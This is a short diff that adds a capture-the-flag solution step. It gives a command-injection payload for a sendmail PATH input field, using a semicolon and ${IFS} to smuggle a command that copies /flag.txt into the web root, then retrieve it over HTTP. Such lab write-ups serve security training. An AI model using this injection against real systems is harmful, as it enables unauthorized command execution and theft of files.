@@ -1,0 +1,5 @@
+Enter the following payload into the sendmail PATH input field:
+
+/usr/sbin/sendmail;cp${IFS}/flag.txt${IFS}/www/flag.txt
+
+Then navigate to http://<TARGET_IP>:<TARGET_PORT>/flag.txt to read the flag.
